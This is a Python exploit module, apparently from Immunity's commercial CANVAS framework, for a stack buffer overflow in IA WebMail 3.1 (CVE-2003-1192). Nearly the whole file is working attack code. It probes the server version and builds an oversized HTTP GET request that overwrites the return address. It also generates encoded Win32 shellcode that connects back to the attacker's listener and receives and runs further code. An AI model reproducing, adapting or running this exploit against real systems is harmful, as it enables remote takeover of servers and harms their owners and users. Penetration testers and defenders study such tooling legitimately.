#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
IAWebMail stack overflow discovered by Peter Winter-Smith
"""

VERSION="1.0"

CHANGES="""
1.1
Test no longer crashes server
Running from Commandline works better
Added space to the bad character list

1.0 released.

"""


notes="""
You only get one shot with this, since the process dies afterwards. 

If you do the test wrong, and the server hasn't been initialized by hitting it
with IE or Mozilla, then it dies with a null ptr dereference.

Server: WebMail/1.0 appears to be standard on version 3.1
"""


#TODO:...
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="True North Software"
DOCUMENTATION["Notes"]="Stack overflow in IAWebMail 3.X. Will crash service on failure."
DOCUMENTATION["Date public"]="09/03/2003"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["CVE Name"] = "CVE-2003-1192"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1192"
DOCUMENTATION['CVSS'] = 10.0

NAME="IAWebMail"
DESCRIPTION="IA WebMail <= 3.1 Stack Overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]


import sys

sys.path.append(".")
sys.path.append("../../")

import socket
from exploitutils import *
from tcpexploit import tcpexploit


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(8180)
        self.setHost("")
        self.ssl=0
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?,;\"=&+ "
        self.shelloffset=0
        self.returnoffset=0
        self.attacklen=1000
        self.setVersions()
        self.version=0
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, eip
        self.versions[1]=("WebMail 3.1 (Server: WebMail/1.0)",0x1002bd33,1040,1044)
                
    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        from shellcode import shellcodeGenerator
        sc = shellcodeGenerator.win32()
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : localport, "ipaddress" : localhost})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        self.shellcode = sc.get()
        from encoder import chunkedaddencoder
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return 1
        
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        """
        Tests for WebAdmin's presence. Prints out the version if
        found.
        """
        s = self.gettcpsock()
        try:
            self.log("Testing for WebAdmin at %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        
        teststring= "GET / HTTP/1.1\r\n"
        teststring+="Host: localhost\r\n"
        teststring+="User-Agent: Mozilla\r\n"
        teststring+="Content-length: 0\r\n"
        teststring+="Connection: close\r\n"
        teststring+="\r\n"
        
        s.send(teststring)
        data=s.recv(50000)
        self.log("Test for WebMail Returned: %s"%data)

        if data.find("WebMail/1.0")!=-1:
            self.setVersion(1)
            return 1

        return 0
    
    def setSSL(self,ssl):
        self.ssl=ssl
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        if self.version==0:
            if self.test()==0:
                self.log("Not continuing since test failed to set version")
                return 0
            else:
                self.createShellcode()        
        
        #first make socket connection to target port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.set_timeout(5)
        self.log("Running against %s:%d"%(self.host,self.port))
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        sploitstring=self.makesploit()
        self.websend(s,sploitstring)
        data=self.webrecv(s)
        self.log("Received: %s"%data)
        
        return 0
    
    #returns the sploitstring
    def makesploit(self):
        header=""
        body=""
        eip=intel_order(self.versions[self.version][1])
        eiploc=self.versions[self.version][2]
        shellloc=self.versions[self.version][3]
        attackstr="A"*3000
        #attackstr=stroverwrite(attackstr,"B"*4+"C"*4+"D"*4,1040)
        attackstr=stroverwrite(attackstr,eip,eiploc)
        attackstr=stroverwrite(attackstr,"A"*12+self.shellcode,shellloc)
        header="GET /"+attackstr+"HTTP/1.1\r\n\r\n"
        return header+body

    def usage(self):
        print "Usage: %s -t target [-p port:1000] [ -s ] -l localip -d localport [-v version:0]"%sys.argv[0]
        print "-O ssl:1 (toggles ssl)"
        self.displayVersions()
        
      
if __name__ == '__main__':
        print "Running CANVAS "+NAME+" version "+VERSION
        app = theexploit()
        ret = standard_callback_commandline(app)
    
